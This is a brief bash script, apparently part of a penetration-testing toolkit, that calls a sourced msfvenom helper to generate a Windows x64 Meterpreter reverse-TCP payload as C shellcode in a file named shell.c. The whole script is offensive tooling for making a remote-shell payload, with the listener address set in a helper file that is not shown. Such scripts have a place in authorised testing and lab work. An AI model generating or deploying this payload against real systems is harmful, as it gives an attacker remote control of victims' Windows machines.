#!/bin/bash

: '
Create C file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="windows/x64/meterpreter/reverse_tcp"
format="c"
filename="shell.c"

create_reverse_shell "${payload}" "${format}" "${filename}"